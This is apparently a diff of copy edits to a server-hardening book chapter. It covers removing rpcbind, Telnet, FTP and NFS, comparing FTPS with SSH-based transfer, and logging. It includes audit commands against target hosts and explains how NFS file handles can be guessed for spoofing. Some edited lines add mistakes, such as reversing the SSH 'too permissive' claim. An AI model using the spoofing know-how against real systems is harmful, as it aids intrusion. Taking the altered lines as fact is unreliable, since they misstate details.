-One of the [differences](https://www.ibm.com/support/knowledgecenter/SSLTBW_2.2.0/com.ibm.zos.v2r2.halx001/portmap.htm) between the now deprecated [`portmap`](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpc-portmapper) service and `rpcbind` is that `portmap` returns port numbers of the server programs and rpcbind returns universal addresses. This contact detail is then used by the RPC client to know where to send its packets. In the case of a web server we have no need for this.
+One of the [differences](https://www.ibm.com/support/knowledgecenter/SSLTBW_2.2.0/com.ibm.zos.v2r2.halx001/portmap.htm) between the now deprecated [`portmap`](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpc-portmapper) service and `rpcbind` is that `portmap` returns port numbers of the server programs while rpcbind returns universal addresses. This contact detail is then used by the RPC client to know where to send its packets. In the case of a web server we have no need for this.
 
 Spin up Nmap:
 
@@ -2440,7 +2436,7 @@ Spin up Nmap:
 
 ![](images/RemoveRpcBind.png)
 
-Because I was using a non default port for SSH, nmap does not announce it correctly, although as shown in the Process and Practises chapter in the Penetration Testing section of Fascicle 0, using service fingerprinting techniques, it is usually easy to find out what is bound to the port. Tools like [Unhide](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-unhide) will also show you hidden processes bound to hidden ports.
+Because I was using a non-default port for SSH, nmap did't not announce it correctly, although as shown in the Process and Practises chapter in the Penetration Testing section of Fascicle 0, using service fingerprinting techniques, it is usually easy to find out what is bound to the port. Tools such as [Unhide](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-unhide) will also show you hidden processes bound to hidden ports.
 
 To obtain a list of currently running servers (determined by `LISTEN`) on our web server.
 
@@ -2452,17 +2448,17 @@ or
 {linenos=off, lang=Bash}
     sudo netstat -tlpn
 
-As per the previous netstat outputs, we see that `sunrpc` is listening on a port and was started by `rpcbind` with the PID of `1498`. Now Sun Remote Procedure Call is running on port `111` (The same port that `portmap` used to listen on). Netstat can tell you the port, but we have confirmed it with the nmap scan above. Rpcbind is used by NFS (as mentioned above, `rpcbind` is a dependency of nfs-common) and as we do not need or want our web server to be a NFS file server, we can get rid of the `rpcbind` package. If for what ever reason you do actually need the port mapper, then make sure you lock down which hosts/networks it will respond to by modifying the `/etc/hosts.deny` and `/etc/hosts.allow` as seen in the [NFS section](#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs).
+As per the previous netstat outputs, we see that `sunrpc` is listening on a port and was started by `rpcbind` with the PID of `1498`. Sun Remote Procedure Call is running on port `111` (the same port that `portmap` used to listen on). Netstat can tell you the port, but we have confirmed it with the nmap scan above. Rpcbind is used by NFS (as mentioned above, `rpcbind` is a dependency of nfs-common) and as we do not need or want our web server to be a NFS file server, we can remove of the `rpcbind` package. If, for what ever reason you do actually need the port mapper, then make sure you lock down which hosts/networks it will respond to by modifying the `/etc/hosts.deny` and `/etc/hosts.allow` as seen in the [NFS section](#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs).
 
 {linenos=off, lang=Bash}
     dpkg-query -l '*rpc*'
 
-Shows us that `rpcbind` is installed and gives us other details. Now if you have been following along with me and have made the `/usr` mount read only, some stuff will be left behind when we try to purge:
+This shows us that `rpcbind` is installed, and gives us other details. If you have been following along and have made the `/usr` mount read-only, some stuff will be left behind when we try to purge:
 
 {linenos=off, lang=Bash}
     sudo apt-get purge rpcbind
 
-Following are the outputs of interest. Now if you have your mounts set-up correctly, you will not see the following errors, if how ever you do see them, then you will need to spend some more time modifying your `/etc/fstab` as discussed above:
+Following are the outputs of interest. If you have your mounts set up correctly, you will not see the following errors, if however you do see them, then you will need to spend some more time modifying your `/etc/fstab` as discussed above:
 
 {linenos=off, lang=Bash}
     The following packages will be REMOVED:
@@ -2487,9 +2483,9 @@ If you received the above errors, ran the following command again:
 {linenos=off, lang=Bash}
     dpkg-query -l '*rpc*'
 
-Which would yield a result of `pH`, that is a desired action of (p)urge and a package status of (H)alf-installed, and want to continue the removal of `rpcbind`, try the `purge`, `dpkg-query` and `netstat` command again to make sure `rpcbind` is gone and of course no longer listening.
+This yields a result of `pH`, that is a desired action of (p)urge and a package status of (H)alf-installed, continue the removal of `rpcbind`, try the `purge`, `dpkg-query` and `netstat` command again to make sure `rpcbind` is gone and of course no longer listening.
 
-Also you can remove unused dependencies now, after you get the following message:
+You can also remove unused dependencies now, after you receive the following message:
 
 {linenos=off, lang=Bash}
     The following packages were automatically installed and are no longer required:
@@ -2501,11 +2497,11 @@ Also you can remove unused dependencies now, after you get the following message
  {linenos=off, lang=Bash}
     sudo apt-get -s autoremove
 
-Because I want to simulate what is going to be removed because I am paranoid and have made stupid mistakes with autoremove years ago, and that pain has stuck with me ever since. I auto-removed a meta-package which depended on many other packages. A subsequent autoremove for packages that had a sole dependency on the meta-package meant they would be removed. Yes it was a painful experience. `/var/log/apt/history.log` has your recent apt history. I used this to piece back together my system.
+I always want to simulate what is going to be removed because I am paranoid and have made stupid mistakes with autoremove years ago, and that pain has stuck with me ever since. I once auto-removed a meta-package which depended on many other packages. A subsequent autoremove for packages that had a sole dependency on the meta-package meant they would be removed. Yes, it was a painful experience. `/var/log/apt/history.log` has your recent apt history. I used this to piece back together my system.
 
-Then follow up with the real thing… Just remove the `-s` and run it again. Just remember, the less packages your system has the less code there is for an attacker to exploit.
+Then follow up with the real thing: remove the `-s` and run it again. Just remember, the less packages your system has, the less code there is for an attacker to exploit.
 
-The port mapper should never be visible from a hostile network, especially the internet. The same goes for all RPC servers due to reflected and often amplified DoS attacks.
+The port mapper should never be visible from a hostile network, especially the Internet. The same goes for all RPC servers due to reflected and often amplified DoS attacks.
 
 You can also stop `rpcbind` responses by modifying the two below hosts files like so: 
 
@@ -2515,9 +2511,9 @@ You can also stop `rpcbind` responses by modifying the two below hosts files lik
 {title="/etc/hosts.deny", linenos=off, lang=Bash}
     rpcbind : ALL
 
-The above changes to the two hosts files would be effective immediately. A restart of the port mapper would not be required in this case.
+The above changes to the two hosts files are effective immediately. A restart of the port mapper would not be required in this case.
 
-There are further details around the `/etc/hosts.[deny & allow]` files in the [NFS section](#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs) that will help you fine tune which hosts and networks should be permitted to query and receive response from the port mapper. Be sure to check them out if you are going to retain the port mapper, so you do not become a victim of a reflected amplified DoS attack, and that you keep any RPC servers that you may need exposed to your internal clients. You can test this by running the same command that we did in the [Identify Risks](#vps-identify-risks-unnecessary-and-vulnerable-services-portmap-rpcinfo-t) section.
+There are further details specific to the `/etc/hosts.[deny & allow]` files in the [NFS section](#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs) that will help you fine tune which hosts and networks should be permitted to query and receive response from the port mapper. Be sure to check them out if you are going to retain the port mapper, so you do not become a victim of a reflected amplified DoS attack, while keeping any RPC servers that you may need exposed to your internal clients. You can test this by running the same command that we did in the [Identify Risks](#vps-identify-risks-unnecessary-and-vulnerable-services-portmap-rpcinfo-t) section.
 
 {title="rpcinfo", linenos=off, lang=bash}
     rpcinfo -T udp <target host> 
@@ -2537,7 +2533,7 @@ You will notice in the response as recorded by Wireshark, that the length is now
 #### Remove Telnet {#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-telnet}
 ![](images/ThreatTags/PreventionEASY.png)
 
-Do not use Telnet for your own systems, SSH provides encrypted shell access and was designed to replace Telnet. Use it instead, there are also many ways you can [harden SSH](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-hardening-ssh).
+Do not use Telnet for your systems, SSH provides encrypted shell access and was designed to replace Telnet. Use SSH instead, there are also many ways you can [harden SSH](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-hardening-ssh).
 
 {linenos=off, lang=Bash}
     dpkg-query -l '*telnet*'
@@ -2555,7 +2551,7 @@ Telnet gone?
 #### Remove FTP {#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-ftp}
 ![](images/ThreatTags/PreventionEASY.png)
 
-I do not believe there is any place to use FTP, even on a network that you think is safe. The first problem here, if you are still thinking like this, is that the network you think may be safe is a perfect place for someone to exploit, this stems from the Fortress Mentality, as discussed in the Physical and Network chapters.
+There is no place for FTP, even on a secure network. The problem is that the network you think may be safe remains a perfect place for exploitation, per the Fortress Mentality, as discussed in the Physical and Network chapters.
 
 {linenos=off, lang=Bash}
     dpkg-query -l '*ftp*'
@@ -2570,57 +2566,57 @@ Ftp gone?
 {linenos=off, lang=Bash}
     dpkg-query -l '*ftp*'
 
-Let us take a look at FTPS, SFTP and SCP
+Let's take a look at FTPS, SFTP and SCP
 
 **FTPS is FTP over TLS with some issues**
 
-There were two separate methods to invoke FTPS client security, defined by which port they initiate communications with:
+There are two separate methods to invoke FTPS client security, defined by which port they initiate communications with:
 
 1. Implicit   
    The client is expected to immediately challenge the FTPS server with a TLS `ClientHello` message before any other FTP commands are sent by the client. If the FTPS server does not receive the initial TLS `ClientHello` message first, the server should drop the connection.  
    
    Implicit also requires that all communications of the FTP session be encrypted.  
    
-   In order to maintain compatibility with existing FTP clients, implicit FTPS was expected to also listen on the command / control channel using port 990/TCP, and the data channel using port 989/TCP. This left port 21/TCP for legacy no encryption communication. Using port 990 implicitly implied encryption was mandatory.  
+   In order to maintain compatibility with existing FTP clients, implicit FTPS is expected to also listen on the command / control channel using port 990/TCP, and the data channel using port 989/TCP. This leaves port 21/TCP for legacy unencrypted communication. Using port 990 implicitly implies encryption was mandatory.  
    
-   This is the earlier and mostly considered deprecated method.  
+   This is the earliest implementation and considered deprecated.  
    
 2. Explicit  
-   The client starts a conversation with the FTPS server on port 21/TCP and can then request to upgrade to using a mutually agreed encryption method. The FTPS server can also decide to allow the client to continue an unencrypted conversation or not. The client has to actually ask for the security upgrade.  
+   The client starts a conversation with the FTPS server on port 21/TCP and then requests an upgrade to a mutually agreed encryption method. The FTPS server can also decide to allow the client to continue an unencrypted conversation or not. The client has to ask for the security upgrade.  
    
    This method also allows the FTPS client to decide whether they want to encrypt nothing, encrypt just the command channel (which the credentials are sent over), or encrypt everything.
 
-So as you can see, it is quite conceivable that a user may become confused as to whether encryption is on, is not on, which channel it is applied to and not applied to. The user has to understand the differences between the two methods of invoking security, not invoking it at all, or only on one of the channels.
+As you can see, it is quite conceivable that a user may become confused as to whether encryption is on, is not on, which channel it is applied to, and not applied to. The user has to understand the differences between the two methods of invoking security, not invoking it at all, or only on one of the channels.
 
-One thing that you really do not want when it comes to privacy, is confusion. When it comes to SFTP or any protocol over SSH, everything is encrypted, simple as that.
+One thing that you really do not want, when it comes to privacy, is confusion. When it comes to SFTP or any protocol over SSH, everything is encrypted, simple as that.
 
-Similar to a web server serving HTTPS with a public key certificate, an FTPS server will also respond with its public key certificate (keeping its private key private). The public key certificate it responds with needs to be generated from a Certificate Authority (CA), whether it is one the server administrator has created (self signed) or a public "trusted" CA (often paid for), the CA (root) certificate must be copied and/or reside locally to the FTPS client. The checksum of the CA (root) certificate will need to be verified also.
+Similar to a web server serving HTTPS with a public key certificate, an FTPS server will also respond with its public key certificate (keeping its private key private). The public key certificate it responds with needs to be generated from a Certificate Authority (CA), whether it is one the server administrator has created (self signed), or a public "trusted" CA (often paid for). The CA (root) certificate must be copied and/or reside locally to the FTPS client. The checksum of the CA (root) certificate will need to be verified as well.
 
 If the FTPS client does not already have the CA (root) certificate when the user initiates a connection, the FTPS client should generate a warning due to the fact that the CA (root) certificate is not yet trusted.
 
-This process is quite complicated and convoluted as opposed to how FTP over SSH works.
+This process is quite complicated and convoluted, as opposed to how FTP over SSH.
 
 {#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-ftp-sftp}
 **SFTP is FTP over SSH**
 
-As I have already detailed in the section [SSH Connection Procedure](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-ssh-connection-procedure), the SSH channel is first set-up, thus the client is already authenticated, and their identity is available to the FTP protocol or any protocol wishing to use the encrypted channel. The public key is securely copied from the client to the server out-of-band. If the configuration of SSH is carried out correctly and hardened as I detailed throughout the [SSH](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh) countermeasures section, the SFTP and any protocol for that matter over SSH has the potential for greater security than those using the Trusted Third Party (TTP) model, which X.509 certificates (utilised in FTPS, HTTPS, OpenVPN, not the [less secure IPSec](http://louwrentius.com/why-you-should-not-use-ipsec-for-vpn-connectivity.html)) rely on.
+As I have already detailed in the section [SSH Connection Procedure](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-ssh-connection-procedure), when the SSH channel is first set up, thus the client is already authenticated, and their identity is available to the FTP protocol or any protocol wishing to use the encrypted channel. The public key is securely copied from the client to the server out-of-band. If the configuration of SSH is carried out correctly and hardened as I detailed throughout the [SSH](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh) countermeasures section, the SFTP, and any protocol for that matter, over SSH has the potential for greater security than those using the Trusted Third Party (TTP) model.
 
 Why is SSH capable of a higher level of security?
 
-With SSH, you copy the public key that you created on your client using `ssh-copy-id` to the server. There are no other parties involved. Even if the public key gets compromised, unless the attacker has the private key, which never leaves the client, they can not be authenticated to the server and they can not MItM your SSH session, as that would issue a warning due to the key fingerprint of the MItM no longer matching that in your `known_hosts` file. Even if an attacker managed to get near your private key, SSH will not run if the permissions of the `~/.ssh/` directory and files within are to permissive, so the user knows immediately anyway. Even then, if somehow the private key was compromised, the attacker still needs the pass-phrase. SSH is a perfect example of defence in depth.
+With SSH, you copy the public key that you created on your client using `ssh-copy-id` to the server. There are no other parties involved. Even if the public key is compromised, unless the attacker has the private key, which never leaves the client, they can not be authenticated to the server and they can not MItM your SSH session. A MiTM attack would lead to a warning due to the key fingerprint of the MItM failing to match that in your `known_hosts` file. Even if an attacker managed to get close to your private key, SSH will not run if the permissions of the `~/.ssh/` directory, and files within, are set to permissive. Even then, if somehow the private key was compromised, the attacker still needs the passphrase. SSH is a perfect example of defence in depth.
 
-with X.509 certificates, you rely (trust) on the third party (the CA). When the third party is compromised (as this happens frequently), many things can go wrong, some of which are discussed in the [X.509 Certificate Revocation Evolution](#network-countermeasures-tls-downgrade-x509-cert-revocation-evolution) section of the Network chapter. The compromised CA can start issuing certificates to malicious entities. All that may be necessary at this point is for your attacker to [poison your ARP cache](#network-identify-risks-spoofing-arp) if you are relying on IP addresses, or do the same plus poison your DNS. This attack is detailed under the [Spoofing Website](#network-identify-risks-spoofing-website) section in the Network chapter, was demoed at WDCNZ 2015, and also links to a video.
+With X.509 certificates, you rely (trust) on the third party (the CA). When the third party is compromised (as happens frequently), many things can go wrong, some of which are discussed in the [X.509 Certificate Revocation Evolution](#network-countermeasures-tls-downgrade-x509-cert-revocation-evolution) section of the Network chapter. The compromised CA can start issuing certificates to malicious entities. All that may be necessary at this point is for your attacker to [poison your ARP cache](#network-identify-risks-spoofing-arp) if you are relying on IP addresses, or add DNS poisoning. This attack is detailed under the [Spoofing Website](#network-identify-risks-spoofing-website) section in the Network chapter, was demoed at WDCNZ 2015, and has video available.
 
-The CA root certificate must be removed from all clients and you will need to go through the process of creating / obtaining a new certificate with a (hopefully) non compromised CA. With SSH, you only have to trust yourself, and I have detailed what you need to know to make good decisions in the SSH section.
+The CA root certificate must be removed from all clients, and you will need to go through the process of creating/obtaining a new certificate with a CA that isn't compromised. With SSH, you only have to trust yourself, and I have detailed what you need to know to make good decisions in the SSH section.
 
 SSH not only offers excellent security, but is also extremely versatile.
 
 {#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-ftp-scp}
-[**SCP**](https://blog.binarymist.net/2012/03/25/copying-with-scp/) or Secure Copy leverage's the security of SSH, and provides simple copy to and from, so once you have SSH set-up and hardened, you are in good stead to be pulling and pushing files around your networks securely with SSH. The SFTP protocol provides remote file system like capabilities, such as remote file deletion, directory listings, resuming of interrupted transfers. If you do not require the additional features of (S)FTP, SCP may be a good option for you. Like SSH, SCP does not have native platform support on Windows, although Windows support is available, and easy enough to set-up, as I [have done many times](https://blog.binarymist.net/2011/12/27/openssh-from-linux-to-windows-7-via-tunneled-rdp/).
+[**SCP**](https://blog.binarymist.net/2012/03/25/copying-with-scp/), or Secure Copy, leverages the security of SSH, and provides simple copy to and from. Once you have SSH set-up and hardened, you are safe to pull and push files around your networks securely with SSH. The SFTP protocol provides remote file system  capabilities, such as remote file deletion, directory listings, and resumption of interrupted transfers. If you do not require the additional features of (S)FTP, SCP may be a good option for you. Like SSH, SCP does not have native platform support on Windows, although Windows support is available, and easy enough to set up, as I [have done many times](https://blog.binarymist.net/2011/12/27/openssh-from-linux-to-windows-7-via-tunneled-rdp/).
 
-Any features that you may think missing by using SCP rather than SFTP are more than made up for simply by using SSH which in itself provides a complete remote Secure SHell and is very flexible as to how you can use it.
+Any features that you may think missing when using SCP rather than SFTP are more than made up for simply by using SSH, which in itself provides a complete remote Secure Shell, and is very flexible as to how you can use it.
 
-Another example is using [**Rsync over SSH**](https://blog.binarymist.net/2011/03/06/rsync-over-ssh-from-linux-workstation-to-freenas/), which is an excellent way to sync files between machines. Rsync will only copy the files that have been changed since the last sync, so this can be extremely quick
+Another example is the use of [**Rsync over SSH**](https://blog.binarymist.net/2011/03/06/rsync-over-ssh-from-linux-workstation-to-freenas/), which is an excellent way to sync files between machines. Rsync will only copy the files that have been changed since the last sync, so this can be extremely quick.
 
 {linenos=off, lang=Bash}
     # -a, --archive  is archive mode which actually includes -rlptgoD (no -H,-A,-X)
@@ -2634,12 +2630,12 @@ For Windows machines, I also run all of my **RDP sessions over SSH**, see my blo
     ssh -v -f -L 3391:localhost:3389 -N MyUserName@MyWindowsBox
     # Once the SSH channel is up, Your local RDP client just needs to talk to localhost:3391    
 
-So there is no reason to not have all of your inter-machine communications encrypted, whether they be on the internet, or on what you think is a trusted LAN. This is why firewalls are just another layer of defence and [nothing more](#vps-identify-risks-lack-of-firewall).
+There is no reason to not have all of your inter-machine communications encrypted, whether they be on the Internet, or on what you think is a trusted LAN. Remember, firewalls are just another layer of defence and [nothing more](#vps-identify-risks-lack-of-firewall).
 
 #### NFS {#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs}
 ![](images/ThreatTags/PreventionAVERAGE.png)
 
-You should not need NFS running on a web server. The packages required for the NFS server to be running are nfs-kernel-server, which has a dependency on nfs-common (common to server and clients), which also has a dependency of rpcbind.
+You should not need NFS running on a web server. The packages required for the NFS server are nfs-kernel-server, which has a dependency on nfs-common (common to server and clients), which also has a dependency of rpcbind.
 
 NFSv4 (December 2000) no longer requires the [portmap](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpc-portmapper) service. Rpcbind is the replacement.
 
@@ -2648,12 +2644,12 @@ Issue the following command to confirm that the NFS server is not installed:
 {linenos=off, lang=Bash}
     dpkg-query -l '*nfs*'
 
-This may show you that you have nfs-common installed, but ideally you do not want nfs-kernel-server installed. If it is you can just:
+This may show you that you have nfs-common installed, but ideally you do not want nfs-kernel-server installed. If it is, you can just:
 
 {linenos=off, lang=Bash}
     apt-get remove nfs-kernel-server
 
-If you do need NFS running for a file server, the usual files that will need some configuration will be the following:
+If you do need NFS running for a file server, the files that need configuration will be the following:
 
 * `/etc/exports` (Only file required to actually export your shares)
 * `/etc/hosts.allow`
@@ -2665,34 +2661,34 @@ The above `hosts.[allow | deny]` provide the accessibility options. You really n
 
 The [exports](https://linux.die.net/man/5/exports) man page has all the details (and some examples) you need, but I will cover some options here.
 
-In the below example `/dir/you/want/to/export` is the directory (and sub directories) that you want to share, this could also be an entire volume, but keeping these as small as possible is a good start.
+In the below example `/dir/you/want/to/export` is the directory (and sub directories) that you want to share. These could also be an entire volume, but keeping things as small as possible is a good start.
 
 {title="/etc/exports", linenos=off, lang=Bash}
     </dir/you/want/to/export>   machine1(option1,optionn) machine2(option1,optionn) machinen(option1,optionn)
 
-`machine1`, `machine2`, `machinen` are the machines that you want to have access to the spescified exported share. These can be specified as their DNS names or IP addresses, using IP addresses can be a little more secure and reliable than using DNS addresses. If using DNS, make sure the names are fully qualified domain names.
+`machine1`, `machine2`, `machinen` are the machines that you want to have access to the specified exported share. These can be specified as their DNS names or IP addresses, using IP addresses can be a little more secure and reliable than using DNS addresses. If using DNS, make sure the names are fully qualified domain names.
 
 Some of the more important options are:
 
 * `ro`: The client will not be able to write to the exported share (this is the default), and I do not use `rw` which allows the client to also write.
-* `root_squash`: This prevents remote root users that are connected from also having root privileges, assigning them the user ID of the `nfsnobody`, thus effectively "squashing" the power of the remote user to the lowest privileges possible on the server. Or even better, use `all_squash`.
+* `root_squash`: This prevents remote root users who are connected from also having root privileges, assigning them the user ID of the `nfsnobody`, thus effectively "squashing" the power of the remote user to the lowest privileges possible on the server. Even better, use `all_squash`.
 * From 1.1.0 of `nfs-utils` onwards, `no_subtree_check` is a default. `subtree_check` was the previous default, which would cause a routine to verify that files requested by the client were in the appropriate part of the volume. The `subtree_check` caused more issues than it solved.
 * `fsid`: is used to specify the file system that is exported, this could be a UUID, or the device number. NFSv4 clients have the ability to see all of the exports served by the NFSv4 server as a single file system. This is called the NFSv4 pseudo-file system. This pseudo-file system is identified as a [single, real file system](https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-nfs-server-config-exports.html#id3077674), identified at export with the `fsid=0` option.
 * `anonuid` and `anongid` explicitly set the uid and gid of the anonymous account. This option makes all requests look like they come from a specific user. By default the uid and gid of 65534 is used by exportfs for squashed access. These two options allow us to override the uid and gid values.
 
-The following is one of the configs I have used on several occasions: 
+Following is one of the configs I have used on several occasions: 
 
 {title="/etc/exports", linenos=off, lang=Bash}
     # Allow read only access to all hosts within subnet to the /dir/you/want/to/export directory
     # as user nfsnobody.
     </dir/you/want/to/export>   10.10.0.0/24(ro,fsid=0,sync,root_squash,no_subtree_check,anonuid=65534,anongid=65534)
 
-Then on top of this sort of configuration, you need to make sure that the local server mounts are as restrictive as we set-up in the ["Lock Down the Mounting of Partitions"](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions) section, and also the file permissions for other, at the exported level recursively, are as restrictive as practical for you. Now we are starting to achieve a little defence in depth.
+In addition to this sort of configuration, you need to make sure that the local server mounts are as restrictive as we set up in the ["Lock Down the Mounting of Partitions"](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions) section. The file permissions for other, at the exported level recursively, should also be as restrictive as practical for you. Now we start to achieve a little defence in depth.
 
-Now if you have been following along with the NFS configuration because you are working on a file server rather than a web server, lets just take this a little further with some changes to `/etc/hosts.deny` and `/etc/hosts.allow`.  
-The access control language used in these two files is the same as each other, just that `hosts.deny` is consulted for which entities to deny to which services, and `hosts.allow` for which to allow for the same.
+If you have been following along with the NFS configuration, because you are working on a file server rather than a web server, let's take this further with some changes to `/etc/hosts.deny` and `/etc/hosts.allow`.  
+The access control language used in these two files is the same as each other, just that `hosts.deny` is consulted to deny access to services, and `hosts.allow` defines allows for the same.
 
-Each line of these two files specifies (in the simplest form) a single service or process and a set of hosts in numeric form (not DNS). In the more complex forms, _daemon@host_ and _user@host_.
+Each line of these two files specifies (in the simplest form) a single service or process and a set of hosts in numeric form (not DNS). In the more complex forms, you'll see _daemon@host_ and _user@host_.
 
 You can add `ALL:ALL` to your `hosts.deny`, but if you install a new service that uses these files, then you will be left wondering why it is not working. I prefer to be more explicit, but it is up to you.
 
@@ -2747,18 +2743,16 @@ Then run another `showmount` to audit your exports:
 {linenos=off, lang=bash}
     showmount -e <target host>
 
-&nbsp;
-
-A client communicates with the servers mount daemon. If the client is authorised, the mount daemon then provides the root file handle of the exported filesystem to the client, at which point the client can send packets referencing the file handle. Making correct guesses of valid file handles can often be easy. The file handles consist of:
+A client communicates with the server's mount daemon. If the client is authorised, the mount daemon then provides the root file handle of the exported filesystem to the client, at which point the client can send packets referencing the file handle. Making correct guesses of valid file handles can often be easy. The file handles consist of:
 
 1. A filesystem Id (visible in `/etc/fstab` usually world readable, or by running `blkid`).
 2. An inode number. For example, the `/` directory on the standard Unix filesystem has the inode number of 2, `/proc` is 1. You can see these with `ls -id <target dir>`
-3. A generation count, this value can be a little more fluid, although many inodes such as the `/` are not deleted very often, so the count remains small and reasonably guessable. Using a tool `istat` can provide these details if you want to have a play.
+3. A generation count, this value can be a little more fluid, although many inodes such as the `/` are not deleted very often, so the count remains small and reasonably guessable. Using a tool `istat` can provide these details if you want to have a go at it. 
 
 Thus allowing a spoofing type of attack, which has been made more difficult by the following measures:
 
-1. Prior to NFS version 4, UDP could be used, making spoofed requests easier, which allowed an attacker to perform Create, Read, Update, Delete (CRUD) operations on the exported file system(s)
-2. By default `exportfs` is run with the `secure` option, requiring that requests originate from a privileged port (<1024). We can see with the following commands that this is the case, so whoever attempts to mount an export must be root.
+1. Prior to NFS version 4, UDP could be used (making spoofed requests easier) which allowed an attacker to perform Create, Read, Update, Delete (CRUD) operations on the exported file system(s)
+2. By default `exportfs` is run with the `secure` option, requiring that requests originate from a privileged port (<1024). We can see, with the following commands, that this is the case, so whoever attempts to mount an export must be root.
 
 {linenos=off, lang=bash}
     # From a client:
@@ -2774,11 +2768,11 @@ Or with the newer Socket Statistics:
     # Produces:
     tcp ESTAB 0 0 <nfs client host>:702 <nfs host>:2049
 
-Prior to this spoofing type vulnerability largely being mitigated, one option that was used was to randomise the generation number of every inode on the filesystem using a tool `fsirand`, which was available for some versions of Unix, although not Linux. This made guessing the generation number harder, thus mitigating these spoofing type of attacks. This would usually be scheduled to run say once a month.
+Prior to mitigations for this spoofing vulnerability, one option was to randomise the generation number of every inode on the filesystem using a tool `fsirand`, which was available for some versions of Unix, although not Linux. This made guessing the generation number harder, thus mitigating spoofing attacks. This would usually be scheduled to run once a month.
 
-`fsirand` would be run on the `/` directory while in single-user mode  
+Run `fsirand` on the `/` directory while in single-user mode  
 or  
-on un-mounted filesystems, run `fsck`, and if no errors were produced, run `fsirand`
+on un-mounted filesystems, run `fsck`, and if no errors are produced, run `fsirand`
 
 {linenos=off, lang=bash}
     umount <filesystem> # /dev/sda1 for example
@@ -2808,49 +2802,48 @@ Check the most recent login of all users, or of a given user. `lastlog` sources 
 
 %% This section is also linked to from the "Insufficient Logging and Monitoring" section in web applications.
 
-I recently performed an [in-depth evaluation](#vps-countermeasures-lack-of-visibility-web-server-log-management) of a small collection of logging and alerting offerings, the choice of which candidates to bring into the in-depth evaluation came from an [initial evaluation](#vps-countermeasures-lack-of-visibility-logging-and-alerting-initial-evaluation).
+I recently performed an [in-depth evaluation](#vps-countermeasures-lack-of-visibility-web-server-log-management) of a small collection of logging and alerting offerings. I chose candidates for the in-depth evaluation from an [initial evaluation](#vps-countermeasures-lack-of-visibility-logging-and-alerting-initial-evaluation).
 
-It is very important to make sure you have reliable and all-encompassing logging to an off-site location. This way attackers will have to also compromise that location in order to effectively [cover their tracks](http://www.win.tue.nl/~aeb/linux/hh/hh-13.html).
+It is very important to make sure you have reliable and all-encompassing logging shipped to an offsite location. This way attackers will have to also compromise the offsite location in order to effectively [cover their tracks](http://www.win.tue.nl/~aeb/linux/hh/hh-13.html).
 
-You can often see in logs when access has been granted to an entity, when files have been modified or removed. Become familiar with what your logs look like and which events create which messages. A good sys-admin can sight logs and quickly see anomalies. If you keep your log aggregator open at least when ever you are working on the servers that generate the events, you will quickly get used to recognising which events cause which log entries.
+You can often see in logs when access has been granted to an entity, and when files have been modified or removed. Become familiar with what your logs look like and which events create which messages. A good sysadmin can review logs and quickly see anomalies. If you keep your log aggregator open, at least whenever you're working on servers that generate events, you will quickly get used to recognising which events cause which log entries.
 
-Alerting events should also be set-up for expected, unexpected actions and a dead man's snitch.
+Alerting events should also be set up for expected and unexpected actions.
 
 Make sure you have reviewed who can [write and read](http://www.tldp.org/HOWTO/Security-HOWTO/secure-prep.html#logs) your logs, especially those created by the `auth` facility, and make any modifications necessary to the permissions.
 
-In order to have logs that provide the information you need, you need to make sure the logging level is set to produce the required amount of verbosity. That time stamps are synchronised across your network. That you archive the logs for long enough to be able to diagnose malicious activity and movements across the network.
+In order to have logs that provide the information you need, you need to make sure the logging level is set to produce the required amount of verbosity and that time stamps are synchronised across your network. You must also archive logs for long enough to be able to diagnose malicious activity and movements across the network.
 
-Being able to rely on the times of events on different network nodes is essential to making sense of tracking an attackers movements through your network. I discuss setting up Network Time Protocol (NTP) on your networked machines in the [Network](#network-countermeasures-fortress-mentality-insufficient-logging-ntp) chapter.
+The ability to rely on the times of events on different network nodes is essential to making sense of tracking an attacker's movements through your network. I discuss setting up Network Time Protocol (NTP) on your networked machines in the [Network](#network-countermeasures-fortress-mentality-insufficient-logging-ntp) chapter.
 
 {#vps-countermeasures-lack-of-visibility-logging-and-alerting-initial-evaluation}
 * [Simple Log Watcher](https://sourceforge.net/projects/swatch/)  
-Or as it used to be called before being asked to change its name from Swatch (Simple Watchdog), by the Swiss watch company, is a pearl script that monitors “a” log file for each instance you run (or schedule), matches your defined regular expression patterns based on the configuration file which defaults to `~/.swatchrc` and performs any action you can script. You can define different message types with different font styles and colours. Simple Log Watcher can tail the log file, so your actions will be performed in real-time.  
+It used to be called Swatch before being asked to change its name by the Swiss watch company of the same name. It's a Perl script that monitors a log file for each instance you run (or schedule), matches your defined regular expression patterns based on the configuration file which defaults to `~/.swatchrc`, and performs any action you can script. You can define different message types with different font styles and colours. Simple Log Watcher can tail the log file, so your actions will be performed in real-time.  
   
-Each log file you want to monitor, you need a separate `swatchrc` file and a separate instance of Simple Log Watcher, as it only takes one file argument. If you want to monitor a lot of log files without aggregating them, this could get messy.  
+For each log file you want to monitor, you need a separate `swatchrc` file and a separate instance of Simple Log Watcher, as it only takes one file argument. If you want to monitor a lot of log files without aggregating them, this could get messy.  
   
 See the [Additional Resources](#additional-resources-vps-countermeasures-lack-of-visibility-logging-and-alerting-swatch) chapter.  
   
 * [Logcheck](https://packages.debian.org/stretch/logcheck)  
